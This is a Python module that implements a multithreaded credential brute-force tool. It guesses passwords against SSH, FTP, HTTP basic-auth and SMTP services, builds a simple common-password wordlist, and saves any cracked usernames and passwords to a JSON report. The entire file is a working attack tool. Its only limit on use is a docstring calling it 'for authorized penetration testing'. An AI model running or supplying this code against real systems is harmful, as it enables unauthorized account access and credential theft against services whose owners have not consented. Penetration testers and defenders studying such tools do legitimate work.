#!/usr/bin/env python3
"""
MATUS HYDRA MODULE
Brute force attack framework for authorized penetration testing
"""

import socket
import paramiko
import ftplib
import smtplib
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import json

class MatusHydra:
    def __init__(self, threads=10, timeout=5):
        self.threads = threads
        self.timeout = timeout
        self.results = []
        self.found_credentials = []
        self.lock = threading.Lock()

    def ssh_brute_force(self, host, port=22, usernames=None, passwords=None):
        """Brute force SSH authentication"""
        if not usernames or not passwords:
            return {"error": "Usernames and passwords required"}

        results = {
            "service": "SSH",
            "host": host,
            "port": port,
            "attempts": 0,
            "successful": [],
            "failed": 0
        }

        def try_ssh(username, password):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=port, username=username, password=password, timeout=self.timeout)
                
                with self.lock:
                    results["successful"].append({"username": username, "password": password})
                    self.found_credentials.append({
                        "service": "SSH",
                        "host": host,
                        "username": username,
                        "password": password
                    })
                
                ssh.close()
                return True
            except:
                with self.lock:
                    results["failed"] += 1
                return False

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    with self.lock:
                        results["attempts"] += 1
                    futures.append(executor.submit(try_ssh, username, password))
            
            for future in as_completed(futures):
                future.result()

        return results

    def ftp_brute_force(self, host, port=21, usernames=None, passwords=None):
        """Brute force FTP authentication"""
        if not usernames or not passwords:
            return {"error": "Usernames and passwords required"}

        results = {
            "service": "FTP",
            "host": host,
            "port": port,
            "attempts": 0,
            "successful": [],
            "failed": 0
        }

        def try_ftp(username, password):
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=self.timeout)
                ftp.login(username, password)
                
                with self.lock:
                    results["successful"].append({"username": username, "password": password})
                    self.found_credentials.append({
                        "service": "FTP",
                        "host": host,
                        "username": username,
                        "password": password
                    })
                
                ftp.quit()
                return True
            except:
                with self.lock:
                    results["failed"] += 1
                return False

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    with self.lock:
                        results["attempts"] += 1
                    futures.append(executor.submit(try_ftp, username, password))
            
            for future in as_completed(futures):
                future.result()

        return results

    def http_brute_force(self, url, usernames=None, passwords=None, method="GET"):
        """Brute force HTTP authentication"""
        if not usernames or not passwords:
            return {"error": "Usernames and passwords required"}

        results = {
            "service": "HTTP",
            "url": url,
            "attempts": 0,
            "successful": [],
            "failed": 0
        }

        def try_http(username, password):
            try:
                if method == "GET":
                    response = requests.get(url, auth=(username, password), timeout=self.timeout)
                else:
                    response = requests.post(url, auth=(username, password), timeout=self.timeout)
                
                if response.status_code == 200:
                    with self.lock:
                        results["successful"].append({"username": username, "password": password})
                        self.found_credentials.append({
                            "service": "HTTP",
                            "url": url,
                            "username": username,
                            "password": password
                        })
                    return True
            except:
                pass
            
            with self.lock:
                results["failed"] += 1
            return False

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    with self.lock:
                        results["attempts"] += 1
                    futures.append(executor.submit(try_http, username, password))
            
            for future in as_completed(futures):
                future.result()

        return results

    def smtp_brute_force(self, host, port=25, usernames=None, passwords=None):
        """Brute force SMTP authentication"""
        if not usernames or not passwords:
            return {"error": "Usernames and passwords required"}

        results = {
            "service": "SMTP",
            "host": host,
            "port": port,
            "attempts": 0,
            "successful": [],
            "failed": 0
        }

        def try_smtp(username, password):
            try:
                smtp = smtplib.SMTP(host, port, timeout=self.timeout)
                smtp.starttls()
                smtp.login(username, password)
                
                with self.lock:
                    results["successful"].append({"username": username, "password": password})
                    self.found_credentials.append({
                        "service": "SMTP",
                        "host": host,
                        "username": username,
                        "password": password
                    })
                
                smtp.quit()
                return True
            except:
                with self.lock:
                    results["failed"] += 1
                return False

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    with self.lock:
                        results["attempts"] += 1
                    futures.append(executor.submit(try_smtp, username, password))
            
            for future in as_completed(futures):
                future.result()

        return results

    def generate_wordlist(self, base_words=None, min_length=4, max_length=12):
        """Generate common passwords"""
        if base_words is None:
            base_words = ["password", "admin", "user", "test", "root", "123456", "qwerty"]
        
        wordlist = base_words.copy()
        
        # Add variations
        for word in base_words:
            wordlist.append(word + "123")
            wordlist.append(word + "!")
            wordlist.append(word.capitalize())
            wordlist.append(word + "2024")
        
        return wordlist

    def get_found_credentials(self):
        """Get all found credentials"""
        return {
            "total_found": len(self.found_credentials),
            "credentials": self.found_credentials
        }

    def export_report(self, filename="brute_force_report.json"):
        """Export results to JSON report"""
        report = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_credentials_found": len(self.found_credentials),
            "credentials": self.found_credentials,
            "results": self.results
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        return {"status": "Report exported", "file": filename}

# Export functions
def hydra_ssh(host, port=22, usernames=None, passwords=None, threads=10):
    hydra = MatusHydra(threads=threads)
    return hydra.ssh_brute_force(host, port, usernames, passwords)

def hydra_ftp(host, port=21, usernames=None, passwords=None, threads=10):
    hydra = MatusHydra(threads=threads)
    return hydra.ftp_brute_force(host, port, usernames, passwords)

def hydra_http(url, usernames=None, passwords=None, method="GET", threads=10):
    hydra = MatusHydra(threads=threads)
    return hydra.http_brute_force(url, usernames, passwords, method)

def hydra_smtp(host, port=25, usernames=None, passwords=None, threads=10):
    hydra = MatusHydra(threads=threads)
    return hydra.smtp_brute_force(host, port, usernames, passwords)

def hydra_wordlist(base_words=None, min_length=4, max_length=12):
    hydra = MatusHydra()
    return hydra.generate_wordlist(base_words, min_length, max_length)
